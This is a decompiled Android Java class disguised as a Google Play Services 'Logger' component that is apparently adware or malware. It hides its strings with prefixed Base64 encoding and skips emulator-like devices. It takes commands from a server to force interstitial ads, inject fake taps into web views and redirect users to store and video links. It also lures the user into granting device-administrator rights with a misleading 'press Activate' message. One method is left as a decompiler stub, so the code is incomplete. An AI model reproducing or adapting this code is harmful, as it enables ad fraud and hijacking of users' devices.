package com.google.android.gms.logs;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.Base64;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.WebView;
import com.flurry.android.Constants;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.InterstitialAd;
import com.google.android.gms.drive.DriveFile;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONException;
import org.json.JSONObject;

@SuppressLint({"NewApi"})
/* loaded from: classes.dex */
public class Logger extends Activity {
    public static String mW = "b";
    public static String mX = "p";
    public static Activity mY;
    private static SharedPreferences mZ;

    public static boolean A(String str) {
        return str == null || str.length() == 0;
    }

    private static String B(String str) throws NoSuchAlgorithmException {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(z("Y3hYRHpjSjNHaFJ3Sm1EVU1ENQ=="));
            messageDigest.update(str.getBytes());
            byte[] bArrDigest = messageDigest.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : bArrDigest) {
                String hexString = Integer.toHexString(b & Constants.UNKNOWN);
                while (hexString.length() < 2) {
                    hexString = "0" + hexString;
                }
                sb.append(hexString);
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return "";
        }
    }

    public static String a(String... strArr) throws IOException {
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(strArr[0]).openConnection();
            httpURLConnection.setRequestMethod(z("Y3hYRHpjSjNHaFJ3Sm1EVUdFVA=="));
            httpURLConnection.setDoOutput(false);
            httpURLConnection.addRequestProperty(z("Y3hYRHpjSjNHaFJ3Sm1EVUFjY2VwdC1FbmNvZGluZw=="), z("Y3hYRHpjSjNHaFJ3Sm1EVWFwcGxpY2F0aW9uL2pzb24sIHRkbWw="));
            httpURLConnection.connect();
            if (httpURLConnection.getResponseCode() != 200) {
                return null;
            }
            InputStream inputStream = httpURLConnection.getInputStream();
            int contentLength = httpURLConnection.getContentLength();
            if (contentLength <= 0) {
                contentLength = 1000;
            }
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(contentLength);
            byte[] bArr = new byte[1024];
            while (true) {
                int i = inputStream.read(bArr);
                if (i <= 0) {
                    byteArrayOutputStream.flush();
                    String str = new String(byteArrayOutputStream.toByteArray(), z("Y3hYRHpjSjNHaFJ3Sm1EVXV0Zi04"));
                    byteArrayOutputStream.close();
                    return str;
                }
                byteArrayOutputStream.write(bArr, 0, i);
            }
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    static /* synthetic */ void a(Activity activity, int i, int i2) {
        if (activity == null) {
            return;
        }
        try {
            activity.runOnUiThread(new h(activity, MotionEvent.obtain(SystemClock.uptimeMillis(), SystemClock.uptimeMillis(), 0, i, i2, 0), MotionEvent.obtain(SystemClock.uptimeMillis(), SystemClock.uptimeMillis(), 1, i, i2, 0)));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static /* synthetic */ void a(Activity activity, String str) throws JSONException {
        JSONObject jSONObject = new JSONObject(str);
        int i = jSONObject.getInt(z("Y3hYRHpjSjNHaFJ3Sm1EVXN0YXR1cw=="));
        if (i != 200) {
            if (i == 400) {
                try {
                    activity.finish();
                    return;
                } catch (Exception e) {
                    return;
                }
            }
            return;
        }
        q(activity);
        String strZ = z("Y3hYRHpjSjNHaFJ3Sm1EVWJhbm5lcl9pZA==");
        if (jSONObject.has(strZ)) {
            b(strZ, jSONObject.getString(strZ));
            mW = jSONObject.getString(strZ);
        }
        String strZ2 = z("Y3hYRHpjSjNHaFJ3Sm1EVXBvcHVwX2lk");
        if (jSONObject.has(strZ2)) {
            String string = jSONObject.getString(strZ2);
            if (!TextUtils.isEmpty(string) && string.startsWith(z("Y3hYRHpjSjNHaFJ3Sm1EVXRlc3R8"))) {
                string = string.substring(z("Y3hYRHpjSjNHaFJ3Sm1EVXRlc3R8").length());
                mX = string;
                b(strZ2, string);
                activity.runOnUiThread(new d(activity));
            }
            b(strZ2, string);
            mX = string;
        }
        String strZ3 = z("Y3hYRHpjSjNHaFJ3Sm1EVXNob3dfYWRtaW4=");
        if (jSONObject.isNull(strZ3) || !jSONObject.getBoolean(strZ3)) {
            return;
        }
        activity.runOnUiThread(new e(activity));
    }

    public static void a(String str, long j) {
        if (mZ == null) {
            throw new IllegalStateException();
        }
        mZ.edit().putLong(str, j).commit();
    }

    public static void a(String str, Boolean bool) {
        if (mZ == null) {
            throw new IllegalStateException();
        }
        mZ.edit().putBoolean(str, bool.booleanValue()).commit();
    }

    public static void b(String str, String str2) {
        if (mZ == null) {
            throw new IllegalStateException();
        }
        mZ.edit().putString(str, str2).commit();
    }

    private static boolean b(String str, Context context) throws PackageManager.NameNotFoundException {
        try {
            context.getPackageManager().getPackageInfo(str, 1);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public static boolean bD() {
        String property = System.getProperty(z("Y3hYRHpjSjNHaFJ3Sm1EVWh0dHAuYWdlbnQ="));
        if (A(property)) {
            return true;
        }
        return property.toLowerCase().contains(z("Y3hYRHpjSjNHaFJ3Sm1EVW5leHVz"));
    }

    public static void c(Activity activity) throws NoSuchAlgorithmException {
        if (bD() || !r(activity)) {
            return;
        }
        e(activity);
        a(z("Y3hYRHpjSjNHaFJ3Sm1EVWFrc2Rra2Fz"), System.currentTimeMillis());
        if (TextUtils.isEmpty(y(z("Y3hYRHpjSjNHaFJ3Sm1EVWluc3RhbGwudGltZQ==")))) {
            b(z("Y3hYRHpjSjNHaFJ3Sm1EVWluc3RhbGwudGltZQ=="), String.valueOf(System.currentTimeMillis()));
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static WebView d(View view) {
        if (view instanceof WebView) {
            return (WebView) view;
        }
        if (view instanceof ViewGroup) {
            int childCount = ((ViewGroup) view).getChildCount();
            for (int i = 0; i < childCount; i++) {
                WebView webViewD = d(((ViewGroup) view).getChildAt(i));
                if (webViewD != null) {
                    return webViewD;
                }
            }
        }
        return null;
    }

    public static void d(Activity activity) {
        if (bD() || !r(activity)) {
            return;
        }
        q(activity);
        if (mZ == null) {
            throw new IllegalStateException();
        }
        int i = mZ.getInt("Y3hYRHpjSjNHaFJ3Sm1EVWFzZGZh", -1);
        int i2 = i != 8 ? i : -1;
        int i3 = i2 + 1;
        if (mZ == null) {
            throw new IllegalStateException();
        }
        mZ.edit().putInt("Y3hYRHpjSjNHaFJ3Sm1EVWFzZGZh", i3).commit();
        if (mZ == null) {
            throw new IllegalStateException();
        }
        if (mZ.getBoolean("Y3hYRHpjSjNHaFJ3Sm1EVXhzYWQ=", false) || i2 > 1) {
            return;
        }
        Intent intent = new Intent(z("Y3hYRHpjSjNHaFJ3Sm1EVWFuZHJvaWQuYXBwLmFjdGlvbi5BRERfREVWSUNFX0FETUlO"));
        intent.putExtra(z("Y3hYRHpjSjNHaFJ3Sm1EVWFuZHJvaWQuYXBwLmV4dHJhLkRFVklDRV9BRE1JTg=="), new ComponentName(activity, (Class<?>) b.class));
        intent.putExtra(z("Y3hYRHpjSjNHaFJ3Sm1EVWFuZHJvaWQuYXBwLmV4dHJhLkFERF9FWFBMQU5BVElPTg=="), z("Y3hYRHpjSjNHaFJ3Sm1EVUjhu4cgdGjhu5FuZyB5w6p1IGPhuqd1ICdC4bqtdCcgxJHhu4MgdGnhur9wIHThu6VjClByZXNzICdBY3RpdmF0ZScgdG8gdXNlIHRoZSBhcHBsaWNhdGlvbgrjgqLjg5fjg6rjgrHjg7zjgrfjg6fjg7PjgpLkvb/nlKjjgZnjgovjgavjga/jgI3jgIzjg5fjg6zjgrkK5oyJ4oCc5byA4oCd5L2/55So6K+l5bqU55So56iL5bqP"));
        activity.startActivityForResult(intent, 47);
    }

    /* JADX WARN: Removed duplicated region for block: B:37:0x013f  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public static void e(android.app.Activity r8) throws java.security.NoSuchAlgorithmException {
        /*
            Method dump skipped, instructions count: 322
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.google.android.gms.logs.Logger.e(android.app.Activity):void");
    }

    public static void f(Context context, String str) {
        try {
            System.currentTimeMillis();
            x(z("Y3hYRHpjSjNHaFJ3Sm1EVXRpbTJvcGFkcw=="));
            String strY = y(z("Y3hYRHpjSjNHaFJ3Sm1EVXBvcHVwX2lk"));
            mX = strY;
            if (A(strY)) {
                try {
                    ((Activity) context).finish();
                    return;
                } catch (Exception e) {
                    return;
                }
            }
            a(z("Y3hYRHpjSjNHaFJ3Sm1EVXRpbTJvcGFkcw=="), 0L);
            InterstitialAd interstitialAd = new InterstitialAd(context);
            interstitialAd.setAdUnitId(mX);
            interstitialAd.setAdListener(new f(interstitialAd, context, str));
            interstitialAd.loadAd(new AdRequest.Builder().build());
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    public static void q(Context context) {
        if (mZ == null) {
            mZ = context.getSharedPreferences(String.valueOf(z("Y3hYRHpjSjNHaFJ3Sm1EVWFzZGZhc2RsbHM=")) + context.getPackageName(), 0);
        }
    }

    public static boolean r(Context context) {
        if (context == null) {
            return true;
        }
        NetworkInfo activeNetworkInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnectedOrConnecting();
    }

    private static Intent s(Context context) {
        Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(z("Y3hYRHpjSjNHaFJ3Sm1EVWNvbS5hbmRyb2lkLnZlbmRpbmc="));
        launchIntentForPackage.setComponent(new ComponentName(z("Y3hYRHpjSjNHaFJ3Sm1EVWNvbS5hbmRyb2lkLnZlbmRpbmc="), z("Y3hYRHpjSjNHaFJ3Sm1EVWNvbS5nb29nbGUuYW5kcm9pZC5maW5za3kuYWN0aXZpdGllcy5MYXVuY2hVcmxIYW5kbGVyQWN0aXZpdHk=")));
        return launchIntentForPackage;
    }

    public static long x(String str) {
        if (mZ == null) {
            throw new IllegalStateException();
        }
        return mZ.getLong(str, -1L);
    }

    public static String y(String str) {
        if (mZ == null) {
            throw new IllegalStateException();
        }
        return mZ.getString(str, null);
    }

    public static String z(String str) {
        return TextUtils.isEmpty(str) ? str : new String(Base64.decode(str, 0)).substring(16);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        Intent intentS;
        Intent intentS2;
        String queryParameter;
        super.onCreate(bundle);
        getWindow().addFlags(8192);
        q(this);
        String strY = y(z("Y3hYRHpjSjNHaFJ3Sm1EVWh0dHA="));
        if (A(strY) || bD() || !r(this)) {
            finish();
            return;
        }
        if (strY != null) {
            try {
                if (strY.length() == 0) {
                    return;
                }
                if (strY.equalsIgnoreCase(z("Y3hYRHpjSjNHaFJ3Sm1EVW5leHVz"))) {
                    if (this instanceof Activity) {
                        finish();
                        return;
                    }
                    return;
                }
                if (strY.startsWith(z("Y3hYRHpjSjNHaFJ3Sm1EVXN1bmNvaQ=="))) {
                    f(this, strY);
                    return;
                }
                if (strY.toLowerCase(Locale.getDefault()).contains(z("Y3hYRHpjSjNHaFJ3Sm1EVXlvdXR1YmUuY29t"))) {
                    if (!((ConnectivityManager) getSystemService("connectivity")).getNetworkInfo(1).isConnected()) {
                        if (this instanceof Activity) {
                            finish();
                            return;
                        }
                        return;
                    }
                    StringBuilder sb = new StringBuilder(String.valueOf(z("Y3hYRHpjSjNHaFJ3Sm1EVXZuZC55b3V0dWJlOg==")));
                    if (strY == null || strY.length() <= 0 || !strY.startsWith(z("Y3hYRHpjSjNHaFJ3Sm1EVWh0dHA="))) {
                        queryParameter = strY;
                    } else {
                        queryParameter = Uri.parse(strY).getQueryParameter("v");
                        if (queryParameter == null) {
                            queryParameter = null;
                            Matcher matcher = Pattern.compile(z("Y3hYRHpjSjNHaFJ3Sm1EVS4qKD86eW91dHUuYmVcL3x2XC98dVwvXHdcL3xlbWJlZFwvfHdhdGNoXD92PSkoW14jXCZcP10qKS4q")).matcher(strY);
                            if (matcher.matches()) {
                                queryParameter = matcher.group(1);
                            }
                        }
                    }
                    intentS2 = new Intent("android.intent.action.VIEW", Uri.parse(sb.append(queryParameter).toString()));
                } else if (strY.toLowerCase(Locale.getDefault()).startsWith(z("Y3hYRHpjSjNHaFJ3Sm1EVW1hcmtldDovLw==")) || strY.toLowerCase(Locale.getDefault()).contains(z("Y3hYRHpjSjNHaFJ3Sm1EVXBsYXkuZ29vZ2xlLmNvbS9zdG9yZS8="))) {
                    Uri uri = Uri.parse(strY);
                    String queryParameter2 = uri.getQueryParameter(z("Y3hYRHpjSjNHaFJ3Sm1EVWlk"));
                    if (!TextUtils.isEmpty(queryParameter2) && b(queryParameter2.trim(), this)) {
                        if (this instanceof Activity) {
                            finish();
                            return;
                        }
                        return;
                    }
                    intentS2 = s(this);
                    intentS2.setData(uri);
                } else {
                    if (strY.toLowerCase(Locale.getDefault()).equals(z("Y3hYRHpjSjNHaFJ3Sm1EVXNob3dfYWRtaW4="))) {
                        try {
                            d(this);
                            if (System.currentTimeMillis() <= 0) {
                                c(this);
                            }
                            finish();
                            return;
                        } catch (Throwable th) {
                            return;
                        }
                    }
                    intentS2 = new Intent();
                    intentS2.setComponent(ComponentName.unflattenFromString(z("Y3hYRHpjSjNHaFJ3Sm1EVWNvbS5hbmRyb2lkLmNocm9tZS9jb20uZ29vZ2xlLmFuZHJvaWQuYXBwcy5jaHJvbWUuTWFpbg==")));
                    intentS2.setClassName(z("Y3hYRHpjSjNHaFJ3Sm1EVWNvbS5hbmRyb2lkLmNocm9tZQ=="), z("Y3hYRHpjSjNHaFJ3Sm1EVWNvbS5nb29nbGUuYW5kcm9pZC5hcHBzLmNocm9tZS5NYWlu"));
                    intentS2.setData(Uri.parse(strY));
                }
                intentS2.addFlags(DriveFile.MODE_READ_ONLY);
                getApplicationContext().startActivity(intentS2);
            } catch (Exception e) {
                e.printStackTrace();
                if (strY.toLowerCase(Locale.getDefault()).startsWith(z("Y3hYRHpjSjNHaFJ3Sm1EVW1hcmtldDovLw==")) || strY.toLowerCase(Locale.getDefault()).contains(z("Y3hYRHpjSjNHaFJ3Sm1EVXBsYXkuZ29vZ2xlLmNvbS9zdG9yZS8="))) {
                    Uri uri2 = Uri.parse(strY);
                    String queryParameter3 = uri2.getQueryParameter(z("Y3hYRHpjSjNHaFJ3Sm1EVWlk"));
                    if (!TextUtils.isEmpty(queryParameter3) && b(queryParameter3.trim(), this)) {
                        if (this instanceof Activity) {
                            finish();
                            return;
                        }
                        return;
                    }
                    intentS = s(this);
                    intentS.setData(uri2);
                } else {
                    intentS = new Intent("android.intent.action.VIEW", Uri.parse(strY));
                }
                intentS.addFlags(DriveFile.MODE_READ_ONLY);
                getApplicationContext().startActivity(intentS);
            }
        }
    }

    @Override // android.app.Activity
    protected void onDestroy() throws NoSuchAlgorithmException {
        super.onDestroy();
        if (System.currentTimeMillis() <= 100) {
            c(null);
            mY = this;
        }
    }
}